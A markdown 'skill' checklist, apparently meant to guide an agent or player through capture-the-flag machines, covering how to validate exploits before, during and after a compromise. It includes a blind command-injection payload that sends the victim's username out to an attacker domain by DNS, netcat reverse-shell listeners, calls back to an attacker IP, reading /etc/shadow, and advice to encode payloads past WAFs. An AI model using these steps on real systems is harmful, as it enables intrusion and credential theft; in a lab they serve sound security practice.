# Skill: Validation & Quality Assurance

> **Domain:** Verification & Quality Gates  
> **Difficulty:** All levels  
> **Prerequisites:** Attention to detail, systematic thinking  
> **Invoke Condition:** After every exploit attempt and at phase transitions

---

## 1. Philosophy

> *"An unvalidated exploit is a hypothesis, not a fact. Validate everything, assume nothing."*

---

## 2. Pre-Exploit Validation

### 2.1 Target Verification
```bash
# Confirm target is reachable
ping -c 3 <target_ip>

# Confirm service is running
nc -zv <target_ip> <port>
nmap -p <port> <target_ip>

# Confirm vulnerability exists (benign test)
# Example: Test for SQLi with sleep(5) before dumping data
# Example: Test for command injection with 'id' before reverse shell
```

### 2.2 Payload Testing
```bash
# Test payload harmlessly first
# For RCE: use 'whoami', 'id', or 'hostname' first
# For file read: read /etc/passwd first
# For file write: write to /tmp/test first

# DNS callback for blind injection
curl "http://<target>/page?param=\`nslookup $(whoami).<your_domain>\`"
# Check if DNS query arrives at your server
```

### 2.3 Environment Setup
```bash
# Confirm listener is ready
nc -lvnp 9001

# Confirm firewall allows outbound from target
# (Test with ping or simple HTTP request from target)
```

---

## 3. During-Exploit Validation

### 3.1 Shell Confirmation
```bash
# Immediate checks upon shell receipt
whoami
id
hostname
pwd

# Check network connectivity from target
# Can we reach our attacker machine?
ping -c 1 <attacker_ip>
curl http://<attacker_ip>:8000/test

# Check if shell is interactive
# Try: cd, ls, cat, nano (if available)
```

### 3.2 Exploit Consistency
```bash
# Run exploit multiple times
# Does it work every time or is it a race condition?
# Document any timing requirements

# Check for WAF/IPS blocking
# If exploit fails on second attempt, might be rate-limited
```

### 3.3 Context Verification
```bash
# Verify user context
whoami
groups

# Verify network position
ip addr
ip route

# Verify OS and version
cat /etc/os-release  # Linux
ver                  # Windows

# Check for containers
ls -la /var/run/docker.sock 2>/dev/null
cat /proc/1/cgroup | grep docker 2>/dev/null
```

---

## 4. Post-Exploit Validation

### 4.1 Flag Verification
```bash
# Confirm flag file exists and is readable
ls -la /home/<user>/user.txt
ls -la /root/root.txt

# Read flag
cat /home/<user>/user.txt
cat /root/root.txt

# Verify flag format (usually starts with specific pattern)
# HTB: starts with hash format
# THM: starts with THM{...}
```

### 4.2 Privilege Level Confirmation
```bash
# Confirm root/SYSTEM access
whoami  # Should show root or nt authority\system
id      # Should show uid=0(root)

# Test root privileges
# Can we read /etc/shadow?
cat /etc/shadow
# Can we write to /root?
touch /root/test_file
```

### 4.3 Attack Chain Completeness
```bash
# Document every step taken
# Can you reproduce the entire chain from scratch?

# Check for missed attack vectors
# Run linpeas/winpeas again as root
# Look for additional flags or interesting files
```

---

## 5. Common Validation Failures

| Failure | Cause | Solution |
|---------|-------|----------|
| Shell dies immediately | Unstable exploit / no pty | Upgrade to interactive shell |
| Wrong user context | Exploit runs as different user | Verify whoami immediately |
| Can't read flag | Wrong permissions / wrong user | Check file permissions with ls -la |
| Exploit works once | Race condition / timing | Add delays, retry logic |
| Connection refused | Firewall / wrong port | Test connectivity with ping/curl |
| Payload blocked | WAF / IDS | Encode payload, use alternative techniques |

---

## 6. Validation Checklist (Master)

```
□ Target reachable and responsive
□ Service version matches exploit requirements
□ Benign payload test succeeded
□ Exploit executed without errors
□ Shell received and stable
□ User context confirmed (whoami/id)
□ Network connectivity from target verified
□ Flag file exists and is readable
□ Flag format is correct
□ Privilege escalation successful (if applicable)
□ Full chain reproducible from scratch
□ No critical errors in logs
□ Screenshots captured for documentation
```

---

*"A hacker who doesn't validate is just a gambler with a terminal."*
